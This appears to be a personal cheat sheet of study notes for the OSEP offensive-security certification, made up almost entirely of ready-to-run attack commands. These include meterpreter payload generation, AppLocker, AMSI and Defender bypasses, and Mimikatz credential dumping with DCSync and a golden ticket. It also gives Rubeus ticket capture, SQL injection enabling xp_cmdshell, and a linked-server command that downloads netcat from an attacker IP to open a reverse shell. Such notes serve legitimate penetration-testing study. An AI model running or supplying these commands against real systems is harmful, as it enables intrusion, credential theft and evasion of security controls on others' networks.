# OSEP-Prep-Notes
OSEP Prep Notes



# Kali File Transfer Server

python -m uploadserver 8000

# RDP with xFreeRDP

xfreerdp /u:USERNAME /p:PASSWORD /w:1366 /h:768 /v:SERVER_IP

# VBA Application Script

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 EXITFUNC=thread -f vbapplication

# Listen With Meterpreter

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST OUR_KALI_IP
set LHOST 443
set EXITFUNC thread
run
```

# Post Exploitation - Migrate To Another Process

```
ps
> find a suitable process (like notepad.exe etc.)

execute -H -f notepad
> or execute any process.

migrate PID_OF_PROCESS
> the migration is success.

run post/windows/manage/migrate
> You should try this too.

getpid
> check current pid
```

# Post Exploitation - Find Readable and Writable Folders
This program is blocked by group policy. For more information, contact your system administrator.
```
accesschk.exe "PWNED_USERNAME" C:\Windows -wus
> Find a RW folder and use the folder for AppLocker Bypass.

or in "powershell -ep bypass"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

# Post Exploitation - Find Executable in Folders:
```
icacls C:\Windows\Tasks
> Find a folder that you have the RX permission.
```

# Post Exploitation - Bypass CLM and AppLocker:
```
> Compile Bypass_CLM_And_AppLocker_Dynamically.cs and get the exe. Upload the exe to the machine. Maybe you should encrypt for Antivirus Evasion.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U bu.exe
> Run with suitable installutil.exe to bypass.
```

# Get LAPS Computers, User Passwords - LAPSToolkit.ps1
```
> Get-LAPSComputers with LAPSToolkit.ps1 shows LAPS Computers and passwords if there is any readable.
Get-LAPSComputers
```

# AD - Mimikatz Tickets
```
mimikatz64.exe

privilege::debug // as always :D

sekurlsa::logonpasswords // if there is a password

sekurlsa::tickets //Get tickets readable.
sekurlsa::tickets /export //export tickets readable as Kirbi file.

kerberos::ptt [0;..]-2-0-..-SERVER@USER-DOMAIN.kirbi //pass the ticket in the kirbi file.

lsadump::dcsync /domain:infinity.com /user:infinity\krbtgt // DC SYNC

kerberos::golden /user:h4x /domain:infinity.com /sid:S-1-5-21-3616753307-3538385277-467097740 /krbtgt:120f9d6c433ec5b065fee44cf0f89354 /ptt //create_a_admin_user with golder krbtgt hash.
> After golden ptt is success, you can check with dir \\dc03.domain.com\c$
> If you can list dir,  use PsExec64.exe \\dc03.domain.com cmd and it will generate a shell.

```

# AD - Listen With Rubeus
```
Rubeus.exe monitor /interval:5 /filteruser:DC03$ //listen every 5 seconds for new TGTs for the user.
> If any TGT captured, it prints the base64 value of the ticket.

Rubeus.exe ptt /ticket:BASE64_TICKET // You can import the ticket with Rubeus again.
> You can dcsync after ptt and get the ntlm hash.
```

# AD - PrintSpooler
```
> While monitoring with Rubeus, you can force tickets to come.
SpoolSample.exe DC03 WEB05
> SpoopSample.exe TARGET CAPTURE // You should monitor with Rubeus in the Capture server.

```

# PsExec

```
PsExec64.exe \\dc.domain.com cmd

```

# Bloodhound - Init
```
neo4j console
> Open bloodhound app in Kali after the neo4j started.
>localhost:7474 neo4j:neo4j

```

# MSSQL - xp_cmdshell
```
123' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1-- -
123' UNION SELECT 1,2,3,4,5; RECONFIGURE-- -
123' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1-- -
123' UNION SELECT 1,2,3,4,5; RECONFIGURE-- -
123' UNION SELECT 1,2,3,4,5; EXEC xp_cmdshell 'ping 192.168.xx.xx'-- -
```
# MSSQL - sqsh and linked sql servers.
```
sqsh -S IP -U username -P password -D dbname
> Connect

EXEC sp_linkedservers;
go
> List linked servers.

select version from openquery("SQL27", 'select @@version as version')
go
> Find version of a linked server.

EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL27;
go
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL27;
go
EXEC ('reconfigure;') AT SQL27;
go
> Allow xp_cmdshell on a linked server remotely.

EXEC ('xp_cmdshell "curl http://192.168.45.172/nc.exe -o nc.exe ; nc.exe -e powershell 192.168.45.172 4444";') AT SQL27;
> Download nc for reverse shell on a linked server.

EXEC ('xp_cmdshell "nc.exe -e powershell 192.168.45.172 4444";') AT SQL27;
> Get a reverse shell after download. Don't forget to listen the port.
```

# AMSI Bypass in Powershell
```
This script contains malicious content and has been blocked by your antivirus software.

(new-object system.net.webclient).downloadstring('http://192.168.xx.xx/amsi.txt') | IEX
> That bypass the amsi.

Import-Module .\PowerView.ps1
> You can import modules now.

```
# Disable Windows Defender in Powershell with Admin
```
Get-MpComputerStatus
> You can check if Antivirus is enabled.

Set-MpPreference -DisableRealtimeMonitoring $true
> Disable realtime monitoring.

Invoke-WebRequest "http://192.168.45.239/mimikatz64.exe" -OutFile ".\m.exe"
> Then You can download minikatz etc. without deleted.
```
# Proxychains with Msfconsole
```
use post/multi/manage/autoroute
set SESSION X
set SUBNET 172.16.X.0
set NETMASK 255.255.255.0
> You can autoroute with meterpreter.


use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 8090
set version 4a
run
> In meterpreter you can create a socks proxy listener.

> After background proxy job, you can use proxychains.
> The last line has the default port number in /etc/proxychains4.conf

proxychains telnet 172.16.X.150 80
proxychains nmap 172.16.X.150 -Pn -v
proxychains firefox
proxychains curl http://172.16.X.150/index.html

```

